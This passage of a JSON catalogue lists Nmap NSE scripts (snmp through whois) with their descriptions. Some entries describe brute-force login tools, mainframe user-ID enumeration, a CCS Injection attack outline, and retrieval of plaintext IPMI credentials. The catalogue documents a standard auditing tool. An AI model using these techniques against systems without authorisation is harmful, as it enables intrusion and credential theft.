    "description": "Attempts to extract system information from an SNMP service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-win32-services.nse",
    "description": "Attempts to enumerate Windows services through SNMP.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-win32-shares.nse",
    "description": "Attempts to enumerate Windows Shares through SNMP.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-win32-software.nse",
    "description": "Attempts to enumerate installed software through SNMP.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-win32-users.nse",
    "description": "Attempts to enumerate Windows user accounts through SNMP",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "socks-auth-info.nse",
    "description": "Determines the supported authentication mechanisms of a remote SOCKS\nproxy server.  Starting with SOCKS version 5 socks servers may support\nauthentication.  The script checks for the following authentication\ntypes:\n  0 - No authentication\n  1 - GSSAPI\n  2 - Username and password",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "socks-brute.nse",
    "description": "Performs brute force password auditing against SOCKS 5 proxy servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "socks-open-proxy.nse",
    "description": "Checks if an open socks proxy is running on the target.\n\nThe script attempts to connect to a proxy server and send socks4 and\nsocks5 payloads. It is considered an open proxy if the script receives\na Request Granted response from the target port.\n\nThe payloads try to open a connection to www.google.com port 80.  A\ndifferent test host can be passed as <code>proxy.url</code>\nargument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssh-auth-methods.nse",
    "description": "Returns authentication methods that a SSH server supports.\n\nThis is in the \"intrusive\" category because it starts an authentication with a\nusername which may be invalid. The abandoned connection will likely be logged.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssh-brute.nse",
    "description": "Performs brute-force password guessing against ssh servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssh-hostkey.nse",
    "description": "Shows SSH hostkeys.\n\nShows the target SSH server's key fingerprint and (with high enough\nverbosity level) the public key itself.  It records the discovered host keys\nin <code>nmap.registry</code> for use by other scripts.  Output can be\ncontrolled with the <code>ssh_hostkey</code> script argument.\n\nYou may also compare the retrieved key with the keys in your known-hosts\nfile using the <code>known-hosts</code> argument.\n\nThe script also includes a postrule that check for duplicate hosts using the\ngathered keys.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssh-publickey-acceptance.nse",
    "description": "This script takes a table of paths to private keys, passphrases, and usernames\nand checks each pair to see if the target ssh server accepts them for publickey\nauthentication. If no keys are given or the known-bad option is given, the\nscript will check if a list of known static public keys are accepted for\nauthentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssh-run.nse",
    "description": "Runs remote command on ssh server and returns command output.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssh2-enum-algos.nse",
    "description": "Reports the number of algorithms (for encryption, compression, etc.) that\nthe target SSH2 server offers. If verbosity is set, the offered algorithms\nare each listed by type.\n\nIf the \"client to server\" and \"server to client\" algorithm lists are identical\n(order specifies preference) then the list is shown only once under a combined\ntype.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sshv1.nse",
    "description": "Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-ccs-injection.nse",
    "description": "Detects whether a server is vulnerable to the SSL/TLS \"CCS Injection\"\nvulnerability (CVE-2014-0224), first discovered by Masashi Kikuchi.\nThe script is based on the ccsinjection.c code authored by Ramon de C Valle\n(https://gist.github.com/rcvalle/71f4b027d61a78c42607)\n\nIn order to exploit the vulnerablity, a MITM attacker would effectively\ndo the following:\n\n    o Wait for a new TLS connection, followed by the ClientHello\n      ServerHello handshake messages.\n\n    o Issue a CCS packet in both the directions, which causes the OpenSSL\n      code to use a zero length pre master secret key. The packet is sent\n      to both ends of the connection. Session Keys are derived using a\n      zero length pre master secret key, and future session keys also\n      share this weakness.\n\n    o Renegotiate the handshake parameters.\n\n    o The attacker is now able to decrypt or even modify the packets\n      in transit.\n\nThe script works by sending a 'ChangeCipherSpec' message out of order and\nchecking whether the server returns an 'UNEXPECTED_MESSAGE' alert record\nor not. Since a non-patched server would simply accept this message, the\nCCS packet is sent twice, in order to force an alert from the server. If\nthe alert type is different than 'UNEXPECTED_MESSAGE', we can conclude\nthe server is vulnerable.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-cert-intaddr.nse",
    "description": "Reports any private (RFC1918) IPv4 addresses found in the various fields of\nan SSL service's certificate.  These will only be reported if the target\naddress itself is not private.  Nmap v7.30 or later is required.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-cert.nse",
    "description": "Retrieves a server's SSL certificate. The amount of information printed\nabout the certificate depends on the verbosity level. With no extra\nverbosity, the script prints the validity period and the commonName,\norganizationName, stateOrProvinceName, and countryName of the subject.\n\n<code>\n443/tcp open  https\n| ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\\\n/stateOrProvinceName=California/countryName=US\n| Not valid before: 2011-03-23 00:00:00\n|_Not valid after:  2013-04-01 23:59:59\n</code>\n\nWith <code>-v</code> it adds the issuer name and fingerprints.\n\n<code>\n443/tcp open  https\n| ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\\\n/stateOrProvinceName=California/countryName=US\n| Issuer: commonName=VeriSign Class 3 Extended Validation SSL CA\\\n/organizationName=VeriSign, Inc./countryName=US\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2011-03-23 00:00:00\n| Not valid after:  2013-04-01 23:59:59\n| MD5:   bf47 ceca d861 efa7 7d14 88ad 4a73 cb5b\n|_SHA-1: d846 5221 467a 0d15 3df0 9f2e af6d 4390 0213 9a68\n</code>\n\nWith <code>-vv</code> it adds the PEM-encoded contents of the entire\ncertificate.\n\n<code>\n443/tcp open  https\n| ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\\\n/stateOrProvinceName=California/countryName=US/1.3.6.1.4.1.311.60.2.1.2=Delaware\\\n/postalCode=95131-2021/localityName=San Jose/serialNumber=3014267\\\n/streetAddress=2211 N 1st St/1.3.6.1.4.1.311.60.2.1.3=US\\\n/organizationalUnitName=PayPal Production/businessCategory=Private Organization\n| Issuer: commonName=VeriSign Class 3 Extended Validation SSL CA\\\n/organizationName=VeriSign, Inc./countryName=US\\\n/organizationalUnitName=Terms of use at https://www.verisign.com/rpa (c)06\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2011-03-23 00:00:00\n| Not valid after:  2013-04-01 23:59:59\n| MD5:   bf47 ceca d861 efa7 7d14 88ad 4a73 cb5b\n| SHA-1: d846 5221 467a 0d15 3df0 9f2e af6d 4390 0213 9a68\n| -----BEGIN CERTIFICATE-----\n| MIIGSzCCBTOgAwIBAgIQLjOHT2/i1B7T//819qTJGDANBgkqhkiG9w0BAQUFADCB\n...\n| 9YDR12XLZeQjO1uiunCsJkDIf9/5Mqpu57pw8v1QNA==\n|_-----END CERTIFICATE-----\n</code>",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-date.nse",
    "description": "Retrieves a target host's time and date from its TLS ServerHello response.\n\n\nIn many TLS implementations, the first four bytes of server randomness\nare a Unix timestamp. The script will test whether this is indeed true\nand report the time only if it passes this test.\n\nOriginal idea by Jacob Appelbaum and his TeaTime and tlsdate tools:\n* https://github.com/ioerror/TeaTime\n* https://github.com/ioerror/tlsdate",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-dh-params.nse",
    "description": "Weak ephemeral Diffie-Hellman parameter detection for SSL/TLS services.\n\nThis script simulates SSL/TLS handshakes using ciphersuites that have ephemeral\nDiffie-Hellman as the key exchange algorithm.\n\nDiffie-Hellman MODP group parameters are extracted and analyzed for vulnerability\nto Logjam (CVE 2015-4000) and other weaknesses.\n\nOpportunistic STARTTLS sessions are established on services that support them.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-enum-ciphers.nse",
    "description": "This script repeatedly initiates SSLv3/TLS connections, each time trying a new\ncipher or compressor while recording whether a host accepts or rejects it. The\nend result is a list of all the ciphersuites and compressors that a server accepts.\n\nEach ciphersuite is shown with a letter grade (A through F) indicating the\nstrength of the connection. The grade is based on the cryptographic strength of\nthe key exchange and of the stream cipher. The message integrity (hash)\nalgorithm choice is not a factor.  The output line beginning with\n<code>Least strength</code> shows the strength of the weakest cipher offered.\nThe scoring is based on the Qualys SSL Labs SSL Server Rating Guide, but does\nnot take protocol support (TLS version) into account, which makes up 30% of the\nSSL Labs rating.\n\nSSLv3/TLSv1 requires more effort to determine which ciphers and compression\nmethods a server supports than SSLv2. A client lists the ciphers and compressors\nthat it is capable of supporting, and the server will respond with a single\ncipher and compressor chosen, or a rejection notice.\n\nSome servers use the client's ciphersuite ordering: they choose the first of\nthe client's offered suites that they also support. Other servers prefer their\nown ordering: they choose their most preferred suite from among those the\nclient offers. In the case of server ordering, the script makes extra probes to\ndiscover the server's sorted preference list. Otherwise, the list is sorted\nalphabetically.\n\nThe script will warn about certain SSL misconfigurations such as MD5-signed\ncertificates, low-quality ephemeral DH parameters, and the POODLE\nvulnerability.\n\nThis script is intrusive since it must initiate many connections to a server,\nand therefore is quite noisy.\n\nIt is recommended to use this script in conjunction with version detection\n(<code>-sV</code>) in order to discover SSL/TLS services running on unexpected\nports. For the most common SSL ports like 443, 25 (with STARTTLS), 3389, etc.\nthe script is smart enough to run on its own.\n\nReferences:\n* Qualys SSL Labs Rating Guide - https://www.ssllabs.com/projects/rating-guide/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-heartbleed.nse",
    "description": "Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).\nThe code is based on the Python script ssltest.py authored by Katie Stafford (katie@ktpanda.org)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-known-key.nse",
    "description": "Checks whether the SSL certificate used by a host has a fingerprint\nthat matches an included database of problematic keys.\n\nThe only databases currently checked are the LittleBlackBox 0.1 database of\ncompromised keys from various devices, some keys reportedly used by the Chinese\nstate-sponsored hacking division APT1\n(https://www.fireeye.com/blog/threat-research/2013/03/md5-sha1.html),\nand the key used by CARBANAK malware\n(https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html).\nHowever, any file of fingerprints will serve just as well. For example, this\ncould be used to find weak Debian OpenSSL keys using the widely available (but\ntoo large to include with Nmap) list.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ssl-poodle.nse",
    "description": "Checks whether SSLv3 CBC ciphers are allowed (POODLE)\n\nRun with -sV to use Nmap's service scan to detect SSL/TLS on non-standard\nports. Otherwise, ssl-poodle will only run on ports that are commonly used for\nSSL.\n\nPOODLE is CVE-2014-3566. All implementations of SSLv3 that accept CBC\nciphersuites are vulnerable. For speed of detection, this script will stop\nafter the first CBC ciphersuite is discovered. If you want to enumerate all CBC\nciphersuites, you can use Nmap's own ssl-enum-ciphers to do a full audit of\nyour TLS ciphersuites.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sslv2-drown.nse",
    "description": "Determines whether the server supports SSLv2, what ciphers it supports and tests for\nCVE-2015-3197, CVE-2016-0703 and CVE-2016-0800 (DROWN)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sslv2.nse",
    "description": "Determines whether the server supports obsolete and less secure SSLv2, and discovers which ciphers it\nsupports.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sstp-discover.nse",
    "description": "Check if the Secure Socket Tunneling Protocol is supported. This is\naccomplished by trying to establish the HTTPS layer which is used to\ncarry SSTP traffic as described in:\n    - http://msdn.microsoft.com/en-us/library/cc247364.aspx\n\nCurrent SSTP server implementations:\n    - Microsoft Windows (Server 2008/Server 2012)\n    - MikroTik RouterOS\n    - SEIL (http://www.seil.jp)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "stun-info.nse",
    "description": "Retrieves the external IP address of a NAT:ed host using the STUN protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "stun-version.nse",
    "description": "Sends a binding request to the server and attempts to extract version\ninformation from the response, if the server attribute is present.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "stuxnet-detect.nse",
    "description": "Detects whether a host is infected with the Stuxnet worm (http://en.wikipedia.org/wiki/Stuxnet).\n\nAn executable version of the Stuxnet infection will be downloaded if a format\nfor the filename is given on the command line.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "supermicro-ipmi-conf.nse",
    "description": "Attempts to download an unprotected configuration file containing plain-text\nuser credentials in vulnerable Supermicro Onboard IPMI controllers.\n\nThe script connects to port 49152 and issues a request for \"/PSBlock\" to\ndownload the file. This configuration file contains users with their passwords\nin plain text.\n\nReferences:\n* http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/\n* https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "svn-brute.nse",
    "description": "Performs brute force password auditing against Subversion source code control servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-asn.nse",
    "description": "Produces a list of IP prefixes for a given routing AS number (ASN).\n\nThis script uses a whois server database operated by the Shadowserver\nFoundation.  We thank them for granting us permission to use this in\nNmap.\n\nOutput is in CIDR notation.\n\nhttp://www.shadowserver.org/wiki/pmwiki.php/Services/IP-BGP",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-ipv6-map4to6.nse",
    "description": "This script runs in the pre-scanning phase to map IPv4 addresses onto IPv6\nnetworks and add them to the scan queue.\n\nThe technique is more general than what is technically termed \"IPv4-mapped IPv6\naddresses.\" The lower 4 bytes of the IPv6 network address are replaced with the\n4 bytes of IPv4 address. When the IPv6 network is ::ffff:0:0/96, then the\nscript generates IPv4-mapped IPv6 addresses. When the network is ::/96, then it\ngenerates IPv4-compatible IPv6 addresses.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-ipv6-multicast-echo.nse",
    "description": "Sends an ICMPv6 echo request packet to the all-nodes link-local\nmulticast address (<code>ff02::1</code>) to discover responsive hosts\non a LAN without needing to individually ping each IPv6 address.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-ipv6-multicast-invalid-dst.nse",
    "description": "Sends an ICMPv6 packet with an invalid extension header to the\nall-nodes link-local multicast address (<code>ff02::1</code>) to\ndiscover (some) available hosts on the LAN. This works because some\nhosts will respond to this probe with an ICMPv6 Parameter Problem\npacket.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-ipv6-multicast-mld.nse",
    "description": "Attempts to discover available IPv6 hosts on the LAN by sending an MLD\n(multicast listener discovery) query to the link-local multicast address\n(ff02::1) and listening for any responses.  The query's maximum response delay\nset to 1 to provoke hosts to respond immediately rather than waiting for other\nresponses from their multicast group.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-ipv6-multicast-slaac.nse",
    "description": "Performs IPv6 host discovery by triggering stateless address auto-configuration\n(SLAAC).\n\nThis script works by sending an ICMPv6 Router Advertisement with a random\naddress prefix, which causes hosts to begin SLAAC and send a solicitation for\ntheir newly configured address, as part of duplicate address detection. The\nscript then guesses the remote addresses by combining the link-local prefix of\nthe interface with the interface identifier in each of the received\nsolicitations. This should be followed up with ordinary ND host discovery to\nverify that the guessed addresses are correct.\n\nThe router advertisement has a router lifetime of zero and a short prefix\nlifetime (a few seconds)\n\nSee also:\n* RFC 4862, IPv6 Stateless Address Autoconfiguration, especially section 5.5.3.\n* https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement.rb",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-ipv6-wordlist.nse",
    "description": "Adds IPv6 addresses to the scan queue using a wordlist of hexadecimal \"words\"\nthat form addresses in a given subnet.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-sniffer.nse",
    "description": "Sniffs the local network for a configurable amount of time (10 seconds\nby default) and prints discovered addresses. If the\n<code>newtargets</code> script argument is set, discovered addresses\nare added to the scan queue.\n\nRequires root privileges. Either the <code>targets-sniffer.interface</code> script\nargument or <code>-e</code> Nmap option to define which interface to use.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-traceroute.nse",
    "description": "Inserts traceroute hops into the Nmap scanning queue. It only functions if\nNmap's <code>--traceroute</code> option is used and the <code>newtargets</code>\nscript argument is given.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "targets-xml.nse",
    "description": "Loads addresses from an Nmap XML output file for scanning.\n\nAddress type (IPv4 or IPv6) is determined according to whether -6 is specified to nmap.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "teamspeak2-version.nse",
    "description": "Detects the TeamSpeak 2 voice communication server and attempts to determine\nversion and configuration information.\n\nA single UDP packet (a login request) is sent. If the server does not have a\npassword set, the exact version, name, and OS type will also be reported on.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "telnet-brute.nse",
    "description": "Performs brute-force password auditing against telnet servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "telnet-encryption.nse",
    "description": "Determines whether the encryption option is supported on a remote telnet\nserver.  Some systems (including FreeBSD and the krb5 telnetd available in many\nLinux distributions) implement this option incorrectly, leading to a remote\nroot vulnerability. This script currently only tests whether encryption is\nsupported, not for that particular vulnerability.\n\nReferences:\n* FreeBSD Advisory: http://lists.freebsd.org/pipermail/freebsd-announce/2011-December/001398.html\n* FreeBSD Exploit: http://www.exploit-db.com/exploits/18280/\n* RedHat Enterprise Linux Advisory: https://rhn.redhat.com/errata/RHSA-2011-1854.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "telnet-ntlm-info.nse",
    "description": "This script enumerates information from remote Microsoft Telnet services with NTLM\nauthentication enabled.\n\nSending a MS-TNAP NTLM authentication request with null credentials will cause the\nremote service to respond with a NTLMSSP message disclosing information to include\nNetBIOS, DNS, and OS build version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tftp-enum.nse",
    "description": "Enumerates TFTP (trivial file transfer protocol) filenames by testing\nfor a list of common ones.\n\nTFTP doesn't provide directory listings. This script tries to retrieve\nfilenames from a list. The list is composed of static names from the\nfile <code>tftplist.txt</code>, plus configuration filenames for Cisco\ndevices that change based on the target address, of the form\n<code>A.B.C.X-confg</code> for an IP address A.B.C.D and for X in 0 to\n255.\n\nUse the <code>tftp-enum.filelist</code> script argument to search for\nother static filenames.\n\nThis script is a reimplementation of tftptheft from\nhttp://code.google.com/p/tftptheft/.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tftp-version.nse",
    "description": "Obtains information (such as vendor and device type where available) from a\nTFTP service by requesting a random filename. Software vendor information is\ndetermined by matching the error message against a database of known software.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tls-alpn.nse",
    "description": "Enumerates a TLS server's supported application-layer protocols using the ALPN protocol.\n\nRepeated queries are sent to determine which of the registered protocols are supported.\n\nFor more information, see:\n* https://tools.ietf.org/html/rfc7301",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tls-nextprotoneg.nse",
    "description": "Enumerates a TLS server's supported protocols by using the next protocol\nnegotiation extension.\n\nThis works by adding the next protocol negotiation extension in the client\nhello packet and parsing the returned server hello's NPN extension data.\n\nFor more information, see:\n* https://tools.ietf.org/html/draft-agl-tls-nextprotoneg-03",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tls-ticketbleed.nse",
    "description": "Detects whether a server is vulnerable to the F5 Ticketbleed bug (CVE-2016-9244).\n\nFor additional information:\n* https://filippo.io/Ticketbleed/\n* https://blog.filippo.io/finding-ticketbleed/\n* https://support.f5.com/csp/article/K05121675",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tn3270-screen.nse",
    "description": "Connects to a tn3270 'server' and returns the screen.\n\nHidden fields will be listed below the screen with (row, col) coordinates.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tor-consensus-checker.nse",
    "description": "Checks if a target is a known Tor node.\n\nThe script works by querying the Tor directory authorities. Initially,\nthe script stores all IPs of Tor nodes in a lookup table to reduce the\nnumber of requests and make lookups quicker.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "traceroute-geolocation.nse",
    "description": "Lists the geographic locations of each hop in a traceroute and optionally\nsaves the results to a KML file, plottable on Google earth and maps.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tso-brute.nse",
    "description": "TSO account brute forcer.\n\nThis script relies on the NSE TN3270 library which emulates a\nTN3270 screen for NMAP.\n\nTSO user IDs have the following rules:\n - it cannot begin with a number\n - only contains alpha-numeric characters and @, #, $.\n - it cannot be longer than 7 chars",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "tso-enum.nse",
    "description": "TSO User ID enumerator for IBM mainframes (z/OS). The TSO logon panel\ntells you when a user ID is valid or invalid with the message:\n <code>IKJ56420I Userid <user ID> not authorized to use TSO</code>.\n\nThe TSO logon process can work in two ways:\n1) You get prompted with <code>IKJ56700A ENTER USERID -</code>\n   to which you reply with the user you want to use.\n   If the user ID is valid it will give you a normal\n   TSO logon screen. Otherwise it will give you the\n   screen logon error above.\n2) You're given the TSO logon panel and enter your user ID\n   at the <code>Userid    ===></code> prompt. If you give\n   it an invalid user ID you receive the error message above.\n\nThis script relies on the NSE TN3270 library which emulates a\nTN3270 screen for NMAP.\n\nTSO user IDs have the following rules:\n - it cannot begin with a number\n - only contains alpha-numeric characters and @, #, $.\n - it cannot be longer than 7 chars",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ubiquiti-discovery.nse",
    "description": "Extracts information from Ubiquiti networking devices.\n\nThis script leverages Ubiquiti's Discovery Service which is enabled by default\non many products. It will attempt to leverage version 1 of the protocol first\nand, if that fails, attempt version 2.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "unittest.nse",
    "description": "Runs unit tests on all NSE libraries.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "unusual-port.nse",
    "description": "Compares the detected service on a port against the expected service for that\nport number (e.g. ssh on 22, http on 80) and reports deviations. The script\nrequires that a version scan has been run in order to be able to discover what\nservice is actually running on each port.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "upnp-info.nse",
    "description": "Attempts to extract system information from the UPnP service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "uptime-agent-info.nse",
    "description": "Gets system information from an Idera Uptime Infrastructure Monitor agent.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "url-snarf.nse",
    "description": "Sniffs an interface for HTTP traffic and dumps any URLs, and their\noriginating IP address. Script output differs from other script as\nURLs are written to stdout directly. There is also an option to log\nthe results to file.\n\nThe script can be limited in time by using the timeout argument or run until a\nctrl+break is issued, by setting the timeout to 0.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ventrilo-info.nse",
    "description": "Detects the Ventrilo voice communication server service versions 2.1.2\nand above and tries to determine version and configuration\ninformation. Some of the older versions (pre 3.0.0) may not have the\nUDP service that this probe relies on enabled by default.\n\nThe Ventrilo server listens on a TCP (voice/control) and an UDP (ping/status)\nport with the same port number (fixed to 3784 in the free version, otherwise\nconfigurable). This script activates on both a TCP and UDP port version scan.\nIn both cases probe data is sent only to the UDP port because it allows for a\nsimple and informative status command as implemented by the\n<code>ventrilo_status.exe</code> executable which has shipped alongside the Windows server\npackage since version 2.1.2 when the UDP status service was implemented.\n\nWhen run as a version detection script (<code>-sV</code>), the script will report on the\nserver version, name, uptime, authentication scheme, and OS.  When run\nexplicitly (<code>--script ventrilo-info</code>), the script will additionally report on the\nserver name phonetic pronunciation string, the server comment, maximum number\nof clients, voice codec, voice format, channel and client counts, and details\nabout channels and currently connected clients.\n\nOriginal reversing of the protocol was done by Luigi Auriemma\n(http://aluigi.altervista.org/papers.htm#ventrilo).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "versant-info.nse",
    "description": "Extracts information, including file paths, version and database names from\na Versant object database.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "vmauthd-brute.nse",
    "description": "Performs brute force password auditing against the VMWare Authentication Daemon (vmware-authd).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "vmware-version.nse",
    "description": "Queries VMware server (vCenter, ESX, ESXi) SOAP API to extract the version information.\n\nThe same script as VMware Fingerprinter from VASTO created by Claudio Criscione, Paolo Canaletti",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "vnc-brute.nse",
    "description": "Performs brute force password auditing against VNC servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "vnc-info.nse",
    "description": "Queries a VNC server for its protocol version and supported security types.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "vnc-title.nse",
    "description": "Tries to log into a VNC server and get its desktop name. Uses credentials\ndiscovered by vnc-brute, or None authentication types. If\n<code>realvnc-auth-bypass</code> was run and returned VULNERABLE, this script\nwill use that vulnerability to bypass authentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "voldemort-info.nse",
    "description": "Retrieves cluster and store information from the Voldemort distributed key-value store using the Voldemort Native Protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "vtam-enum.nse",
    "description": "Many mainframes use VTAM screens to connect to various applications\n(CICS, IMS, TSO, and many more).\n\nThis script attempts to brute force those VTAM application IDs.\n\nThis script is based on mainframe_brute by Dominic White\n(https://github.com/sensepost/mainframe_brute). However, this script\ndoesn't rely on any third party libraries or tools and instead uses\nthe NSE TN3270 library which emulates a TN3270 screen in lua.\n\nApplication IDs only allows for 8 byte IDs, that is the only specific rule\nfound for application IDs.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "vulners.nse",
    "description": "For each available CPE the script prints out known vulns (links to the correspondent info) and correspondent CVSS scores.\n\nIts work is pretty simple:\n* work only when some software version is identified for an open port\n* take all the known CPEs for that software (from the standard nmap -sV output)\n* make a request to a remote server (vulners.com API) to learn whether any known vulns exist for that CPE\n* if no info is found this way, try to get it using the software name alone\n* print the obtained info out\n\nNB:\nSince the size of the DB with all the vulns is more than 250GB there is no way to use a local db.\nSo we do make requests to a remote service. Still all the requests contain just two fields - the\nsoftware name and its version (or CPE), so one can still have the desired privacy.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "vuze-dht-info.nse",
    "description": "Retrieves some basic information, including protocol version from a Vuze filesharing node.\n\nAs Vuze doesn't have a default port for its DHT service, this script has\nsome difficulties in determining when to run. Most scripts are triggered by\neither a default port or a fingerprinted service. To get around this, there\nare two options:\n1. Always run a version scan, to identify the vuze-dht service in order to\n   trigger the script.\n2. Force the script to run against each port by setting the argument\n   vuze-dht-info.allports",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "wdb-version.nse",
    "description": "Detects vulnerabilities and gathers information (such as version\nnumbers and hardware support) from VxWorks Wind DeBug agents.\n\nWind DeBug is a SunRPC-type service that is enabled by default on many devices\nthat use the popular VxWorks real-time embedded operating system. H.D. Moore\nof Metasploit has identified several security vulnerabilities and design flaws\nwith the service, including weakly-hashed passwords and raw memory dumping.\n\nSee also:\nhttp://www.kb.cert.org/vuls/id/362332",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "weblogic-t3-info.nse",
    "description": "No description available",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "whois-domain.nse",
    "description": "Attempts to retrieve information about the domain name of the target",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "whois-ip.nse",
